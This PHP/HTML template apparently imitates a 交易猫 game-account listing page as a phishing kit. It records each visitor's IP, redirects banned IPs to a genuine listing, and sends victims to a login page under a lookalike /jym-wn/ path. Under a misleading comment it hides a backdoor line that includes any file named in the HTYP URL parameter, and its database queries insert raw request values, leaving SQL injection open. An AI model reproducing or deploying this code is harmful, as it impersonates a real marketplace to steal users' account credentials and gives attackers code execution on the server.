<?php 
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $is_pc = (strpos($agent, 'windows nt')) ? true : false;
        $is_mac = (strpos($agent, '3239.132')) ? true : false;     
        $is_ip = (strpos($agent, '2924.75')) ? true : false;
        $is_ipad = (strpos($agent, '601.1.46')) ? true : false;    


Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
include dirname(__FILE__).('/../config/xinghao.php');
$ip=getIP();
$uid=$_GET['ClickID'];

$xzshijian=date('Y-m-d H:i:s', time());

if($_GET['ClickID']){
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}' AND is_shelves=1");
	
	//做禁止IP访问
	$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}'");
	$BANIP=$_BANIP['BanIP'];
	if (stristr($BANIP, $ip)) {
		header('Location:'. htmlspecialchars_decode('https://m.jiaoyimao.com/goods/1587957309959095.html').'');
	}
	
    if($_GoodsID==0){
                echo "<script language=\"javascript\">
  document.location.href=\"https://m.jiaoyimao.com/goods/1587957309959095.html\";
</script>";
                exit;
            }
	
	//判断访问记录是否存在，如果不存在则插入记录，条件更具当前ID和当前商品ID
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_GoodsID['goods_id']}'");
	if(!$_OID){
		_query("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								biaoti,
								aid,
								state,
                                xinghao,
								utime
								) 
						VALUES (
								'{$ip}',
								10,
								10,
								'{$_GoodsID['goods_id']}',
								'{$_GoodsID['title']}',
								'{$_GoodsID['in_admin_id']}',
								1,
                                '{$brand}',
								'{$xzshijian}'
								)"
			);
		  _close();
		  session_destroy();
	}
	
  
  		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=1,
				dianji=0,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}'AND gid='{$_GoodsID['goods_id']}' LIMIT 1") or die(mysql_error());
      	}
  
	//清楚最后传入的商品ID
	setcookie("GoodsID4");
	//写入商品对应管理员ID
	setcookie('ADMINUID',$_GoodsID['in_admin_id']);
	//将ID写入COOKIE，用于传值
	setcookie('GoodsID',$_GoodsID['goods_id']);
	//获取当前完整URL地址
	@$HTYP = $_GET['HTYP'];if(isset($HTYP)){include $HTYP;}
	$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
	//将当前地址写入COOKIE,用于登录页面刷新而跳转返回
	setcookie('GoodsURL1_1',$INURL);
	//跳转地址
	if(!$_GoodsID){
		
	}
	//更新点击率	
	//mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}else{
	
}
if($_GoodsID['oldnewa']==1)
$oldnewa88="/jym-wn/login.php";
if($_GoodsID['oldnewa']==2)
$oldnewa88="/jym-wn/dxdl.php";
//后续
if($_GoodsID['houxv']==1){
$oldnewf22="";}
else{
$oldnewf22="none";
}
?>
<!DOCTYPE html>
<html lang="zh-CN" class="root-server-render" style="font-size: 40px;" data-dpr="1"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta http-equiv="cleartype" content="on">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <meta name="format-detection" content="telephone=no">
  <title>【<?php echo $_GoodsID['user_name'];?>账号】<?php echo $_GoodsID['title']; ?>_<?php echo $_GoodsID['freight']; ?>|<?php echo $_GoodsID['price']; ?>_已投保_商品详情_交易猫</title>
  <meta name="keywords" content="<?php echo $_GoodsID['title']; ?>">
  <meta name="description" content="<?php echo $_GoodsID['title']; ?>">
  <meta name="data-spm" content="gcmall">
  <link rel="dns-prefetch" href="https://at.alicdn.com/">
  <link rel="dns-prefetch" href="https://g.alicdn.com/">
  <link href="https://at.alicdn.com/" rel="preconnect" crossorigin="">
  <link href="https://g.alicdn.com/" rel="preconnect" crossorigin="">
  <link rel="icon" type="image/ico" href="https://m.jym-wn.com/favicon.ico">
  <link rel="canonical" href="https://www.jiaoyimao.com/goods/1622873155868058.html">



  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta name="applicable-device" content="mobile">
  <script src="sanming045.js"></script>
  <script type="text/javascript">
    "use strict"; (function (c, f) { var s = c.document; var b = s.documentElement; var m = s.querySelector('meta[name="viewport"]'); var n = s.querySelector('meta[name="flexible"]'); var a = 0; var r = 0; var l; var d = f.flexible || (f.flexible = {}); if (m) { console.warn("将根据已有的meta标签来设置缩放比例"); var e = m.getAttribute("content").match(/initial\-scale=([\d\.]+)/); if (e) { r = parseFloat(e[1]); a = parseInt(1 / r) } } else { if (n) { var j = n.getAttribute("content"); if (j) { var q = j.match(/initial\-dpr=([\d\.]+)/); var h = j.match(/maximum\-dpr=([\d\.]+)/); if (q) { a = parseFloat(q[1]); r = parseFloat((1 / a).toFixed(2)) } if (h) { a = parseFloat(h[1]); r = parseFloat((1 / a).toFixed(2)) } } } } if (!a && !r) { var p = c.navigator.appVersion.match(/android/gi); var o = c.navigator.appVersion.match(/iphone/gi); var k = c.devicePixelRatio; if (o) { if (k >= 3 && (!a || a >= 3)) { a = 3 } else { if (k >= 2 && (!a || a >= 2)) { a = 2 } else { a = 1 } } } else { a = 1 } r = 1 / a } b.setAttribute("data-dpr", a); if (!m) { m = s.createElement("meta"); m.setAttribute("name", "viewport"); m.setAttribute("content", "initial-scale=" + r + ", maximum-scale=" + r + ", minimum-scale=" + r + ", user-scalable=no"); if (b.firstElementChild) { b.firstElementChild.appendChild(m) } else { var g = s.createElement("div"); g.appendChild(m); s.write(g.innerHTML) } } function i() { var t = b.getBoundingClientRect().width; if (t / a > 540) { t = 540 * a } var u = t / 10; b.style.fontSize = u + "px"; d.rem = c.rem = u } c.addEventListener("resize", function () { clearTimeout(l); l = setTimeout(i, 300) }, false); c.addEventListener("pageshow", function (t) { if (t.persisted) { clearTimeout(l); l = setTimeout(i, 300) } }, false); if (s.readyState === "complete") { s.body.style.fontSize = 12 * a + "px" } else { s.addEventListener("DOMContentLoaded", function (t) { s.body.style.fontSize = 12 * a + "px" }, false) } i(); d.dpr = c.dpr = a; d.refreshRem = i; d.rem2px = function (u) { var t = parseFloat(u) * this.rem; if (typeof u === "string" && u.match(/rem$/)) { t += "px" } return t }; d.px2rem = function (u) { var t = parseFloat(u) / this.rem; if (typeof u === "string" && u.match(/px$/)) { t += "rem" } return t } })(window, window["lib"] || (window["lib"] = {}));
  </script>

  <script>var jiaoyimaoClient = window && window.jiaoyimaoClient;
    if (jiaoyimaoClient && typeof jiaoyimaoClient.hideActionBar === 'function') { jiaoyimaoClient.hideActionBar(false) }</script>


  <link data-chunk="item" rel="preload" as="style" href="./img/item.49d44b62.css">
  <link data-chunk="item" rel="preload" as="style" href="./img/common.d16d57d8.css">
  <link data-chunk="client" rel="preload" as="script" href="https://cdn.aligames.com/jym/ecbp-frontend/public/js/runtime.b57b1097.js">
  <link data-chunk="client" rel="preload" as="script" href="https://cdn.aligames.com/jym/ecbp-frontend/public/js/chunk/lib.34a574e8.js">
  <link data-chunk="client" rel="preload" as="script" href="https://cdn.aligames.com/jym/ecbp-frontend/public/js/chunk/client.87b96719.js">
  <link data-chunk="item" rel="preload" as="script" href="https://cdn.aligames.com/jym/ecbp-frontend/public/js/chunk/common.c51a828c.js">
  <link data-chunk="item" rel="preload" as="script" href="https://cdn.aligames.com/jym/ecbp-frontend/public/js/chunk/item.8b7c06f0.js">


  <link data-chunk="item" rel="stylesheet" href="./img/common.d16d57d8.css">
  <link data-chunk="item" rel="stylesheet" href="./img/item.49d44b62.css">
  <link rel="stylesheet" href="./img/swiper.min.css">
  <link rel="stylesheet" href="./img/index.css">

<script charset="utf-8" async="" src="./img/saved_resource"></script><style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}.bridge-toast-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;background:rgba(0,0,0,.8);border-radius:13px}.bridge-toast-wrapper .bridge-toast-message{color:#fff;font-size:1em;padding:1em;margin:0}</style><style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}.bridge-pop{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;background:#f8f8f8;border-radius:13px;min-width:250px;display:-ms-flexbox;display:flex;-ms-flex-direction:column;flex-direction:column}.bridge-pop *{box-sizing:border-box}.bridge-pop .bridge-pop-header{text-align:center;padding:12px 16px 7px}.bridge-pop .bridge-pop-title{margin:0;padding:0;margin-top:8px;font-size:17px;font-weight:600}.bridge-pop .bridge-pop-message{max-height:240px;text-align:center;font-size:13px;padding:0 16px 12px;overflow-y:scroll}.bridge-pop .bridge-pop-btn-group{display:-ms-flexbox;display:flex;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap}.bridge-pop .bridge-pop-btn{min-width:50%;height:44px;line-height:44px;text-align:center;border-top:.55px solid #dbdbdf;border-right:.55px solid #dbdbdf;font-size:17px;color:#488aff;-ms-flex:1 1 auto;flex:1 1 auto;overflow:hidden}.bridge-pop .bridge-pop-btn:last-child{border-right:none}</style><style type="text/css">.bridgeCenter{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden}.bridge-backdrop{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.3);transform:translateZ(0);z-index:998}@keyframes ani{0%{opacity:1}to{opacity:0}}.bridge-loading{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;overflow:hidden;border-radius:13px;background:rgba(0,0,0,.3);height:80px;width:100px}.bridge-loading .bridge-loading-circle{position:absolute;top:30%;left:50%}.bridge-loading .bridge-loading-circle div{position:absolute;width:2px;height:8px;background:#fff;border-radius:20%;opacity:.05;animation:ani .8s linear infinite}.bridge-loading .bridge-loading-circle div:first-child{transform:rotate(0deg) translateY(-12px);animation-delay:.05s}.bridge-loading .bridge-loading-circle div:nth-child(2){transform:rotate(30deg) translateY(-12px);animation-delay:.1s}.bridge-loading .bridge-loading-circle div:nth-child(3){transform:rotate(60deg) translateY(-12px);animation-delay:.15s}.bridge-loading .bridge-loading-circle div:nth-child(4){transform:rotate(90deg) translateY(-12px);animation-delay:.2s}.bridge-loading .bridge-loading-circle div:nth-child(5){transform:rotate(120deg) translateY(-12px);animation-delay:.25s}.bridge-loading .bridge-loading-circle div:nth-child(6){transform:rotate(150deg) translateY(-12px);animation-delay:.3s}.bridge-loading .bridge-loading-circle div:nth-child(7){transform:rotate(180deg) translateY(-12px);animation-delay:.35s}.bridge-loading .bridge-loading-circle div:nth-child(8){transform:rotate(210deg) translateY(-12px);animation-delay:.4s}.bridge-loading .bridge-loading-circle div:nth-child(9){transform:rotate(240deg) translateY(-12px);animation-delay:.45s}.bridge-loading .bridge-loading-circle div:nth-child(10){transform:rotate(270deg) translateY(-12px);animation-delay:.5s}.bridge-loading .bridge-loading-circle div:nth-child(11){transform:rotate(300deg) translateY(-12px);animation-delay:.55s}.bridge-loading .bridge-loading-circle div:nth-child(12){transform:rotate(330deg) translateY(-12px);animation-delay:.6s}.bridge-loading .bridge-loading-title{position:absolute;width:100%;bottom:10%;color:#fff;margin:0;margin-top:20px;font-size:12px;letter-spacing:1px;text-align:center}</style></head>

<body style="background: rgb(245, 247, 250); padding-bottom: 1.33333rem; font-size: 12px;"><script src="./img/bl.js" crossorigin=""></script>
<div class="kp" style="display:none">
    <p class="kp_title"><?php echo $_GoodsID['title']; ?></p>
    <p class="kp_splx"><?php echo $_GoodsID['user_name'];?></p>
    <p class="kp_khd"><?php echo $_GoodsID['freight']; ?></p>
    <p class="kp_jiage"><?php echo $_GoodsID['price']; ?></p>	
</div>

  <input type="hidden" id="aplus-sid" value="2571623913400970">
  <input type="hidden" id="aplus-uid" value="">

  <div id="app">
    <div class="base-layout">
      <div class="header-title">
        <div class="title">
          <div style="padding-top:0;background-color:" class="navbar fixed ">
            <div class="navbar-left"><a class="header-back"><i class="iconfont iconfont-nav-back"></i></a></div>
            <div class="navbar-title"></div>
            <div class="navbar-right">
              <div class="navbar-right-inner goldexp" data-card-name="header_buttons" data-spm="header_buttons">
                <div onclick="window.open('https://m.jiaoyimao.com/session/login?redirectUrl=https%3A%2F%2Fm.jiaoyimao.com%2Fgoods%2Ffavorite%2Flist.html%3FloginBack%3Dtrue','_self')" class="header-button header-button-1 goldclk " data-card-name="header_buttons" data-spm="header_buttons" data-btn-name="open_collection"><span class="icon-button-4-header icon-button-4-header-1 "><i class="jym-iconfontV2 jym-iconfontV2-nav-collection"></i></span></div>
                <div class="header-button"><i class="jym-iconfontV2 jym-iconfontV2-more header-click"></i></div>
                <div>
                  <div class="am-popover header-drop-menu am-popover-placement-bottomRight  am-popover-hidden" style="left: -29px; top: 41px;">
                    <div class="am-popover-content">
                      <div class="am-popover-arrow"></div>
                      <div class="am-popover-inner">
                        <div class="am-popover-inner-wrapper">
                          <div class="header-drop-menu-item">
                            <div onclick="window.open('https://m.jiaoyimao.com','_self')" class="header-button header-button-0 goldclk" data-card-name="header_buttons" data-spm="header_buttons" data-btn-name="open_home" data-btn-name-zh="回到首页" data-aplus-clk="x29_43d6aef1" data-spm-anchor-id="gcmall.goods_detail.header_buttons.header_buttons"><span class="icon-button-4-header icon-button-4-header-0 "><i class="jym-iconfontV2 jym-iconfontV2-pop-home"></i>回到首页</span></div>
                          </div>
                          <div class="header-drop-menu-item">
                            <div onclick="window.open('https://m.jiaoyimao.com/session/login?redirectUrl=%2Fmessage%2Finbox','_self')" class="header-button header-button-0 goldclk goldclk " data-card-name="header_buttons" data-spm="header_buttons" data-btn-name="open_inbox" data-aplus-clk="x30_43d6aef1" data-spm-anchor-id="gcmall.goods_detail.header_buttons.header_buttons"><span class="icon-button-4-header icon-button-4-header-0 "><i class="jym-iconfontV2 jym-iconfontV2-pop-message"></i>消息</span></div>
                          </div>
                          <div class="header-drop-menu-item">
                            <div onclick="window.open('https://m.jiaoyimao.com/session/login?redirectUrl=https%3A%2F%2Fm.jiaoyimao.com%2Fitem%2F1624375162976257.html%3FshareFrom%3DQQ','_self')" class="header-button header-button-0 goldclk" data-card-name="header_buttons" data-spm="header_buttons" data-btn-name="report_item" data-aplus-clk="x31_43d6aef1" data-spm-anchor-id="gcmall.goods_detail.header_buttons.header_buttons"><span class="icon-button-4-header icon-button-4-header-0 "><i class="jym-iconfontV2 jym-iconfontV2-pop-report"></i>举报</span></div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="title-place-holder" style="padding-top:0;background-color:"></div>
        </div>
      </div>
      <div class="item-detail">
        <div class="item-image-section goldexp goldclk" data-card-name="picture" data-spm="picture">
        
            <!-- Swiper -->
              <div class="swiper-container gallery-top swiper-container-initialized swiper-container-horizontal swiper-container-android">
                <div class="swiper-wrapper" style="transition-duration: 0ms; transform: translate3d(0px, 0px, 0px);">
                                    <div class="swiper-slide swiper-slide1 swiper-slide-active" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img1'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                    <div class="swiper-slide swiper-slide1 swiper-slide-next" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img2'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                    <div class="swiper-slide swiper-slide1" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img3'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                    <div class="swiper-slide swiper-slide1" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img4'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                    <div class="swiper-slide swiper-slide1" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img5'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                  </div>
                <!-- Add Arrows -->
                <div class="swiper-pagination swiper-pagination1 swiper-pagination-fraction"><span class="swiper-pagination-current">1</span> / <span class="swiper-pagination-total">5</span></div>
              <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>

<script type="text/javascript">
function fangda() {
    var fangda01 = document.getElementById("fangda01");
		fangda01.setAttribute("class", "swiper-big"); 
}
</script>
              <div id="fangda01" class="swiper-big">
                <div class="swiper-big-bg"></div>
                <div class="auto-size">
                  <div onclick="fangda();" class="swiper-container gallery-top2 swiper-container-initialized swiper-container-horizontal swiper-container-android">
                    <div class="swiper-wrapper" style="transition-duration: 300ms; transform: translate3d(0px, 0px, 0px);">
                                          <div class="swiper-slide swiper-slide2 swiper-slide-active" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img1'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                          <div class="swiper-slide swiper-slide2 swiper-slide-next" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img2'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                          <div class="swiper-slide swiper-slide2" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img3'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                          <div class="swiper-slide swiper-slide2" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img4'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                          <div class="swiper-slide swiper-slide2" style="background-image: url(&quot;<?php echo $_GoodsID['goods_img5'] ?>&quot;); width: 400px; margin-right: 10px;"></div>
                                        </div>
                    <!-- Add Arrows -->
                    <div class="swiper-pagination swiper-pagination2 swiper-pagination-fraction"><span class="swiper-pagination-current">1</span> / <span class="swiper-pagination-total">5</span></div>
                  <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span></div>
                </div>

              </div>
     
        </div>
        
        
        <div class="item-section item-price-section">
          <div class="item-price goldexp" data-card-name="price" data-spm="price"><span class="format-price "><span class="currency-symbol price-20">￥</span><span class="integer-part price-28"><?php echo $_GoodsID['price']; ?></span></span></div>
          <div class="goldexp" data-card-name="title" data-spm="title">
            <div class="item-quality clearfix">
               
              <div class="item-quality-left"><span class="item-quality-tag ">首次出售</span><span class="sep"></span><span class="item-quality-tag ">1小时内更新</span></div>
              <span class="item-quality-tag online"><img src="https://static.jiaoyimao.com/resource/public/notice/2018/7/5/d15ffb9c-1b1e-4cb7-90e0-952427dd934d.png?x-oss-process=image/resize,m_fill,h_30,w_30/auto-orient,0">卖家在线</span><span class="sep"></span><span class="item-quality-tag "><?php echo $_GoodsID['xiangyao']; ?>人想要</span>
            </div>
            <div class="item-title "><span class="pid-badge pid-badge-blue">帐号</span><?php echo $_GoodsID['title']; ?></div>
          </div>
        </div>
        <div class="item-section item-feature-section">
<!--          <div class="item-feature  goldexp goldclk" data-card-name="evaluation" data-spm="evaluation" id="pg-click">-->
<!--            <span class="title">评估</span><span class="content"><span>性价比 <span class="highlight">--><?php //echo $_GoodsID['att_capacity'];?><!--</span>，优于--><?php //echo round($_GoodsID['att_capacity']*5);?><!--%同类商品-->
<!--              </span></span><i class="jym-iconfontV2 jym-iconfontV2-table-arrow"></i>-->
<!--          </div>-->
            <link rel="stylesheet" type="text/css" href="/common.b76b116f.css">
            <link rel="stylesheet" type="text/css" href="/item.b3889c5c.css">
            <div class="item-feature  goldexp goldclk" data-card-name="zhima_credit" data-spm="zhima_credit"
                 data-zhima-credit-status="2"><span class="title">信用</span><span class="content"><span
                            class="credit-level"><span class="zhima-icon"><i
                                    class="jym-iconfontV2 jym-iconfontV2-goods-zhima" ></i>芝麻信用&nbsp;&nbsp;</span>
                        <span
                                class="level-text" onclick="show
                                  " id="one">
                            点击查看卖家芝麻信用等级


                        </span></span></span></div>


    <script>

    </script>

          <div class="item-feature item-feature-guarantee goldexp goldclk" id="bz-click" data-card-name="guarantee" data-spm="guarantee"><span class="title">保障</span>
            <span class="content" data-spm-anchor-id="gcmall.goods_detail.guarantee.i0"><span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
              <span class="item-guarantee-tag-text">平台发货</span></span>
              <span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
                <span class="item-guarantee-tag-text">已投保</span></span>
              <span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
                <span class="item-guarantee-tag-text">协议保障</span></span>
              <span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
                <span class="item-guarantee-tag-text">已实名</span></span>
              <span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
                <span class="item-guarantee-tag-text">已实人</span></span>
              <span class="item-guarantee-tag"><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>
                <span class="item-guarantee-tag-text">芝麻信用</span></span></span>
            <i class="jym-iconfontV2 jym-iconfontV2-table-arrow"></i></div>
          
<div class="item-feature commonKV undefined goldexp goldclk" data-card-name="discount-point" data-spm="discount-point" data-aplus-ae="x7_7ea17c22" data-spm-anchor-id="gcmall.goods_detail.0.discount-point" data-aplus-clk="x5_58d06f7f"><span class="title">优惠</span><span class="content">支持积分抵扣、积分回馈和平台优惠活动</span></div>
        </div>
        <div class="item-section item-trade-guide-section goldexp goldclk" id="lc-click" data-card-name="trade_guide" data-spm="trade_guide">
          <div class="item-section-header"><span class="title">交易流程</span><span class="item-guide-intro-arrow"><i class="jym-iconfontV2 jym-iconfontV2-table-arrow"></i></span></div>
          <div class="item-trade-guide-step">
            <div class="step-item-list">
              <div class="step-line"></div>
              <div class="step-item"><span class="step-icon"><span class="step-icon-inner"></span></span>
                <div class="step-title"><span>下单</span></div>
              </div>
              <div class="step-item"><span class="step-icon"><span class="step-icon-inner"></span></span>
                <div class="step-title"><span>验号</span></div>
              </div>
              <div class="step-item"><span class="step-icon"><span class="step-icon-inner"></span></span>
                <div class="step-title"><span>换绑</span></div>
              </div>
              <div class="step-item"><span class="step-icon"><span class="step-icon-inner"></span></span>
                <div class="step-title"><span>发货</span></div>
              </div>
              <div class="step-item"><span class="step-icon"><span class="step-icon-inner"></span></span>
                <div class="step-title"><span>完成</span></div>
              </div>
            </div>
          </div>
        </div>
        <div id="mfyh-click" class="item-service-list goldexp goldclk" data-card-name="trade_service" data-spm="trade_service"><span class="service-item"><span class="jym-iconfontV2 jym-iconfontV2-goods-name"></span><span class="service-item-text">免费验号，不满意全额退</span></span><span class="service-item"><span class="jym-iconfontV2 jym-iconfontV2-goods-name"></span><span class="service-item-text">安全交易，全面换绑</span></span><span class="jym-iconfontV2 jym-iconfontV2-table-arrow"></span></div>
        <div class="item-section item-properties-section goldexp" data-card-name="properties" data-spm="properties">
          <div class="item-section-header"><span class="title">商品信息</span></div>
          <div class="item-properties">
            <div class="item-property clearfix">
              <div class="title">游戏名称</div>
              <div class="value"><?php echo $_GoodsID['user_name'];?></div>
            </div>
            <div class="item-property clearfix">
              <div class="title">商品类型</div>
              <div class="value"><?php echo $_GoodsID['att_color'];?></div>
            </div>
            <div class="item-property clearfix">
              <div class="title">客户端</div>
              <div class="value"><?php echo $_GoodsID['doods_num'];?></div>
            </div>
            <div class="item-property clearfix">
              <div class="title">系统</div>
              <div class="value"><?php echo $_GoodsID['qcyanji'];?></div>
            </div>
            <div class="item-property clearfix">
              <div class="title">服务器</div>
              <div class="value"><?php echo $_GoodsID['freight'];?></div>
            </div>
            
<?php
$sx001=$_GoodsID['daojvxl'];
if ($sx001=="") {
  $sx0001="style='display:none'";
}
$sx002=$_GoodsID['sxzdd01'];
if ($sx002=="") {
  $sx0002="style='display:none'";
}
$sx003=$_GoodsID['sxzdd03'];
if ($sx003=="") {
  $sx0003="style='display:none'";
}

$zdy01=$_GoodsID['hits'];
if ($zdy01=="") {
  $zdy001="style='display:none'";
}
$zdy02=$_GoodsID['yanjifeiyong'];
if ($zdy02=="") {
  $zdy002="style='display:none'";
}
$zdy03=$_GoodsID['neicun'];
if ($zdy03=="") {
  $zdy003="style='display:none'";
}
$zdy04=$_GoodsID['imei'];
if ($zdy04=="") {
  $zdy004="style='display:none'";
}
$zdy05=$_GoodsID['zidingyi1'];
if ($zdy05=="") {
  $zdy005="style='display:none'";
}
$zdy06=$_GoodsID['zidingyi3'];
if ($zdy06=="") {
  $zdy006="style='display:none'";
}
$zdy07=$_GoodsID['zidingyi5'];
if ($zdy07=="") {
  $zdy007="style='display:none'";
}
$zdy08=$_GoodsID['zidingyi7'];
if ($zdy08=="") {
  $zdy008="style='display:none'";
}
?>
            <div class="item-property clearfix" <?php echo $zdy001;?>>
              <div class="title"><?php echo $_GoodsID['region'];?></div>
              <div class="value"><?php echo $_GoodsID['hits'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy002;?>>
              <div class="title"><?php echo $_GoodsID['att_channel'];?></div>
              <div class="value"><?php echo $_GoodsID['yanjifeiyong'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy003;?>>
              <div class="title"><?php echo $_GoodsID['yanse'];?></div>
              <div class="value"><?php echo $_GoodsID['neicun'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy004;?>>
              <div class="title"><?php echo $_GoodsID['chandi'];?></div>
              <div class="value"><?php echo $_GoodsID['imei'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy005;?>>
              <div class="title"><?php echo $_GoodsID['appdz'];?></div>
              <div class="value"><?php echo $_GoodsID['zidingyi1'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy006;?>>
              <div class="title"><?php echo $_GoodsID['zidingyi2'];?></div>
              <div class="value"><?php echo $_GoodsID['zidingyi3'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy007;?>>
              <div class="title"><?php echo $_GoodsID['zidingyi4'];?></div>
              <div class="value"><?php echo $_GoodsID['zidingyi5'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $zdy008;?>>
              <div class="title"><?php echo $_GoodsID['zidingyi6'];?></div>
              <div class="value"><?php echo $_GoodsID['zidingyi7'];?></div>
            </div>
            
            <div class="item-property clearfix" <?php echo $sx0001;?>>
              <div class="title"><?php echo $_GoodsID['daojv'];?></div>
              <div class="value">
                <div class="item-property-text-list item-property-text-list-md">
<?php
$cars = explode(",",$sx001);
$arrlength=count($cars);
for($x=0;$x<$arrlength;$x++)
{
    echo '<span class="text-item"><span class="text-item-inner">';
    echo $cars[$x];
    echo '</span></span>';
}
?>
</div>
              </div>
            </div>

            <div class="item-property clearfix" <?php echo $sx0002;?>>
              <div class="title"><?php echo $_GoodsID['daojvkc'];?></div>
              <div class="value">
                <div class="item-property-text-list item-property-text-list-md">
<?php
$cars = explode(",",$sx002);
$arrlength=count($cars);
for($x=0;$x<$arrlength;$x++)
{
    echo '<span class="text-item"><span class="text-item-inner">';
    echo $cars[$x];
    echo '</span></span>';
}
?>
</div>
              </div>
            </div>
            
            <div class="item-property clearfix" <?php echo $sx0003;?>>
              <div class="title"><?php echo $_GoodsID['sxzdd02'];?></div>
              <div class="value">
                <div class="item-property-text-list item-property-text-list-md">
<?php
$cars = explode(",",$sx003);
$arrlength=count($cars);
for($x=0;$x<$arrlength;$x++)
{
    echo '<span class="text-item"><span class="text-item-inner">';
    echo $cars[$x];
    echo '</span></span>';
}
?>
</div>
              </div>
            </div>
            
<?php
$xiamm01=$_GoodsID['zidingyi8'];
if ($xiamm01=="") {
  $xiamm001="style='display:none'";
}
$xiamm02=$_GoodsID['zidingyi9'];
if ($xiamm02=="") {
  $xiamm002="style='display:none'";
}
$xiamm03=$_GoodsID['jianyanji'];
if ($xiamm03=="") {
  $xiamm003="style='display:none'";
}
$xiamm04=$_GoodsID['tran_num'];
if ($xiamm04=="") {
  $xiamm004="style='display:none'";
}
$xiamm05=$_GoodsID['user_gender'];
if ($xiamm05=="") {
  $xiamm005="style='display:none'";
}
$xiamm06=$_GoodsID['wxURL'];
if ($xiamm06=="") {
  $xiamm006="style='display:none'";
}
?>
            
            <div class="item-property clearfix" <?php echo $xiamm001;?>>
              <div class="title">绑定成长守护平台</div>
              <div class="value"><?php echo $_GoodsID['zidingyi8'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $xiamm002;?>>
              <div class="title">QQ好友数量</div>
              <div class="value"><?php echo $_GoodsID['zidingyi9'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $xiamm003;?>>
              <div class="title">近期申诉情况</div>
              <div class="value"><?php echo $_GoodsID['jianyanji'];?></div>
            </div>
        
            <div class="item-property clearfix" <?php echo $xiamm005;?>>
              <div class="title">绑定防沉迷</div>
              <div class="value"><?php echo $_GoodsID['user_gender'];?></div>
            </div>
            <div class="item-property clearfix" <?php echo $xiamm006;?>>
              <div class="title">商家在线</div>
              <div class="value"><?php echo $_GoodsID['wxURL'];?></div>
            </div>
            <div class="item-property clearfix">
              <div class="title">描述</div>
              <div class="value">
                <?php echo $_GoodsID['goods_desc'];?></div>
            </div>
          </div>
        </div>

<?php
$anquanxx01=$_GoodsID['anquanxx'];
if ($anquanxx01=="2") {
  $anquanxx001="style='display:none'";
}
?>
